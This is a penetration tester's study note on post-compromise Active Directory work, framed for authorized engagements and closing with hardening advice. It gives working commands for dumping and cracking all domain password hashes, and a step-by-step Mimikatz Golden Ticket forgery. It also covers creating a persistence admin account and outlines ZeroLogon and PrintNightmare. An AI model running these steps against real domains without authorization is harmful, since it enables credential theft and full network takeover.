---
description: >-
  Exploring further steps post-domain-compromise (after getting the domain admin
  creds).
---

# Post-Domain-Compromise

## Post-Compromise Recommended Steps:

1. Go back and try to find different attack paths to compromise the domain. This is key so that all possible routes can be patched.
2. Dump the NTDS.dit and crack passwords.
3. Enumerate shares for sensitive information - ensures the client is storing data in the correct places.
4. Create persistence. E.g., if a DA realises their account is compromised, then it would be helpful to have a new DA account we created. Also, this would allow us to see if the client's system picks up and detects new DA accounts being created. DELETE THIS AFTER THE PENTEST IS OVER.
5. Create a Golden Ticket - could be useful.

***

## Dumping the NTDS.dit:

* This is a database used to store AD data including:

1. User information
2. Group information
3. Security descriptors
4. Password hashes



Method (with SecretsDump.py):

1. Run SecretsDump.py with the DA's credentials:

```shellscript
root@kali:~# secretsdump.py [Domain].local/[DA Username]:'[DA Password]'@[DC IP] -just-dc-ntlm
```

-> This will dump NTLM hashes of passwords of all domain user accounts stored only in the DC's NTDS database

-> Grab the NT part of the NTLM hashes


Alternatively use CME:

cme ldap <target_ip> --users

```shellscript
root@kali:~# crackmapexec smb [Target IP] -u [Username] -p [Password] --ntds
```


2. Try to crack the hashes. If you manage to crack them. Reminder of the command to run:

{% code title="Using HashCat to crack NTLM hashes dumped from NTDS.dit" %}
```shellscript
root@kali:~# hashcat -m 1000 [File Containing Hashes From NTDS].dit [path to wordlist]
```
{% endcode %}



This tells us information about what kind of passwords the client's user accounts have to help create better password policy/raise awareness if needed. Alternatively, this can also be used to go back and attack and try to do further attack.

***

## Golden Ticket Attacks:

* When we compromise a specific account - krbtgt - we will own the domain. This is the Kerberos Ticket Granting Ticket - allows us to generate tickets.&#x20;
* This means we can use this to request access to any resource or system on the domain, using the ticket granting service through forging a TGT - this will be our Golden Ticket.&#x20;
* It works because the KDC trusts anything signed with the krbtgt key. Thus, the DC doesn't check if the username specified in the attack actually exists or not.&#x20;
* Golden ticket literally means complete access to every machine in the AD (access to shells, files, folders etc.)



Method:

1. We will use Mimikatz. Drop into Mimikatz like this from attacker machine:

```shellscript
root@kali:~# crackmapexec smb <target_ip> -u <username> -p <password> -M mimikatz
```
  
3. We will obtain SeDebugPrivilege to be able to pretend like we're accessing LSASS for "debugging privileges" but we are actually accessing krbtgt's keys in the LSASS for this attack:

```
mimikatz # privilege::debug
```

3. Run this command to get LSASS to return the cryptographic keys for the krbtgt account:

```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

-> "lsadump::lsa": this is a module that interacts with LSASS - the process responsible for Kerberos authentication, ticket signing, credential storage and security policy enforcement. it's where the sensitive authentication keys are.

-> "/inject": injects a temporary authentication package into LSASS to request sensitive data. LSASS would otherwise restrict access.

-> "/name:krbtgt": tells LSASS to return the credential material associated with the krbtgt account (including NTLM hash for krbtgt).



4. Note the Domain SID (we will need this to forge the TGT tickets for this attack). It will look something like this in the section giving Domain details:

```
S-1-5-21-3623811015-3361044348-30300820-1105
```

-> A SID is a Security Identifier given to users, computers, domains etc. in AD

-> This precedes a RID (Relative Identifier) which is appended at the end of the SID to get a full SID, identifying the specific user/computer etc.



5. Get the NTLM hash for the krbtgt account. Note it down as well.
6. Run this command to execute the attack:

```
mimikatz # kerberos::golden /User:FakeUser /domain:[Domain].local /sid:[Domain SID] /krbtgt:[NTLM Hash for krbtgt] /id:[RID of Admin account - 500] /ptt
```

-> \[User] here can just be any user. it doesn't matter if it exists in the domain or not.

-> The RID specified determines the level of privilege the ticket grants. Using RID of 500 will give built-in Admin account privileges. You don't want to impersonate krbtgt so you don't need its RID.

-> "/ptt": means Pass-The-Ticket type of ticket. This means instead of just printing the ticket to the screen, the forged TGT ticket becomes active and can be used in the current Kerberos session run by the attacker to open up processes.



***

## Final AD Attacks:

1. ZeroLogon Attacks: setting the DC password to null to be able to get all information. Dangerous attack because it could destroy the DC - don't run in this in a pentest because it can take down the DC. Just use checks (search online if needed) to see if the client is vulnerable to it.&#x20;



-> This works because the DC uses the password to authenticate to other DCs in the domain. If the password is reset to an invalid one (like null), it breaks that trust relationship, bricking DC function and causing domain instability.&#x20;



2. PrintNightmare attack (can be used post-compromise - you don't need escalated privileges you just one normal account). This exploits the Print Spooler service (runs on every Windows machine - including DCs). It would allow remote code execution and local privilege escalation. Print Spooler runs as SYSTEM so a low-priv user could trick the Print Spooler into loading malicious code with SYSTEM privileges. In an AD environment, this would full domain compromise. To check vulnerability to it, use online-available scripts.&#x20;



***

## AD Lessons:

1. Try to identify the services a client runs. Go online and find default credentials and see if those work.
2. Enumerate as much as possible. Keep enumerating throughout your attacks, not just at the start. After getting one account, enumerate. After finding pieces of information, just enumerate.&#x20;
3. WDigest may be enabled on old machines (generally pre-Windows 7): WDigest is an old Windows authentication protocol that required LSASS to store plaintext passwords in memory. When enabled, it caused LSASS to hold clear‑text credentials, which made credential theft significantly easier. Modern Windows disables WDigest by default to prevent this. Disable it.
4. If basic routes aren't available, look around for anything else on the network and see if they are possible attack vectors. Could be anything at all.&#x20;
5. Don't give service accounts DA privileges.
6. Don't reuse passwords.



